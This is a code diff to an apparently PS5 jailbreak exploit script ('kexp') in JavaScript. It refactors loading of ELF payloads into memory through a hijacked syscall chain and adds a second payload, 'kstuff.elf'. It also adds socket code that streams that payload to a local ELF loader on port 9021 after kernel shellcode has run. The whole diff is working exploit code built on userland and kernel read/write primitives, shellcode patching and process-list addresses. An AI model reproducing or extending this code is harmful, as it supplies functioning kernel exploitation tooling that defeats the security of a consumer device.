@@ -6,6 +6,7 @@ const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;
 
 const DEFAULT_KEXP = "kexp_2026_05_25.bin";
 const DEFAULT_ELFLDR = "elfldr-ps5-1360.elf";
+const DEFAULT_KSTUFF = "kstuff.elf";
 
 const BLOB = {
   size: 18912,
@@ -90,6 +91,65 @@ async function fetchBinary(name) {
   const response = await fetch("payloads/" + name);
   if (!response.ok) throw new Error("kexp: " + name + " returned HTTP " + response.status);
   return new Uint8Array(await response.arrayBuffer());
+}
+
+async function mapElf(name, p, chain) {
+  const elf = await fetchBinary(name);
+  if (elf.length < 0x1000 || readU32(elf, 0) !== 0x464c457f)
+    throw new Error("kexp: " + name + " is not an ELF");
+
+  const size = (elf.length + 0x3fff) & ~0x3fff;
+  const base = await chain.syscall(SYS_MMAP, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
+  if (base.low >>> 0 === 0xffffffff || base.low < 0x10000)
+    throw new Error("kexp: " + name + " mmap failed");
+
+  const dwords = elf.length & ~3;
+  for (let offset = 0; offset < dwords; offset += 4)
+    p.write4(base.add32(offset), readU32(elf, offset));
+  for (let offset = dwords; offset < elf.length; offset++)
+    p.write1(base.add32(offset), elf[offset]);
+  if (p.read4(base) >>> 0 !== 0x464c457f)
+    throw new Error("kexp: " + name + " copy failed");
+
+  return { base, size: elf.length };
+}
+
+async function connectToElfldr(p, chain) {
+  const address = p.malloc(16);
+  p.write8(address, new int64(0, 0));
+  p.write8(address.add32(8), new int64(0, 0));
+  p.write4(address, 0x3d230210); // sockaddr_in: AF_INET, port 9021
+  p.write4(address.add32(4), 0x0100007f); // 127.0.0.1
+
+  for (let attempt = 0; attempt < 40; attempt++) {
+    const socket = await chain.syscall(SYS_SOCKET, 2, 1, 0);
+    const fd = socket.low | 0;
+    if (fd >= 0) {
+      const connected = await chain.syscall(SYS_CONNECT, fd, address, 16);
+      if ((connected.low >>> 0) === 0) return fd;
+      await chain.syscall(SYS_CLOSE, fd);
+    }
+    await new Promise((resolve) => setTimeout(resolve, 250));
+  }
+
+  throw new Error("kexp: elfldr is not listening on port 9021");
+}
+
+async function sendElf(payload, p, chain) {
+  const fd = await connectToElfldr(p, chain);
+
+  try {
+    let offset = 0;
+    while (offset < payload.size) {
+      const length = Math.min(0x10000, payload.size - offset);
+      const result = await chain.syscall(SYS_WRITE, fd, payload.base.add32(offset), length);
+      const written = result.low | 0;
+      if (written <= 0) throw new Error("kexp: kstuff socket write failed");
+      offset += written;
+    }
+  } finally {
+    await chain.syscall(SYS_CLOSE, fd);
+  }
 }
 
 function patchShellcode(blob, symbols) {
@@ -221,22 +281,8 @@ export async function runKexp(krw, p, chain, log, config = {}) {
     throw new Error("kexp: invalid allproc address " + hex(allproc));
   const symbols = resolveSymbols(p);
 
-  const elf = await fetchBinary(config.elfldr || DEFAULT_ELFLDR);
-  if (elf.length < 0x1000 || readU32(elf, 0) !== 0x464c457f)
-    throw new Error("kexp: elfldr is not an ELF");
-
-  const elfLength = (elf.length + 0x3fff) & ~0x3fff;
-  const elfBase = await chain.syscall(SYS_MMAP, 0, elfLength, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
-  if (elfBase.low >>> 0 === 0xffffffff || elfBase.low < 0x10000)
-    throw new Error("kexp: elfldr mmap failed");
-
-  const dwords = elf.length & ~3;
-  for (let offset = 0; offset < dwords; offset += 4)
-    p.write4(elfBase.add32(offset), readU32(elf, offset));
-  for (let offset = dwords; offset < elf.length; offset++)
-    p.write1(elfBase.add32(offset), elf[offset]);
-  if (p.read4(elfBase) >>> 0 !== 0x464c457f)
-    throw new Error("kexp: elfldr copy failed");
+  const elfldr = await mapElf(config.elfldr || DEFAULT_ELFLDR, p, chain);
+  const kstuff = await mapElf(config.kstuff || DEFAULT_KSTUFF, p, chain);
 
   const blob = await fetchBinary(config.kexp || DEFAULT_KEXP);
   patchShellcode(blob, symbols);
@@ -253,12 +299,15 @@ export async function runKexp(krw, p, chain, log, config = {}) {
   p.write4(args.add32(0x08), victim.readFd);
   p.write4(args.add32(0x0c), victim.writeFd);
   p.write8(args.add32(0x10), allproc);
-  p.write8(args.add32(0x18), elfBase);
-  p.write8(args.add32(0x20), elf.length);
+  p.write8(args.add32(0x18), elfldr.base);
+  p.write8(args.add32(0x20), elfldr.size);
 
   const result = await spawnAndJoin(entry, args, symbols, p, chain);
   if (result.joinResult !== 0)
     throw new Error("kexp: pthread_join returned " + hex(result.joinResult));
-  say("shellcode returned " + hex(result.shellcodeResult));
+  say("elfldr returned " + hex(result.shellcodeResult));
+
+  await sendElf(kstuff, p, chain);
+  say("kstuff sent");
   return true;
 }
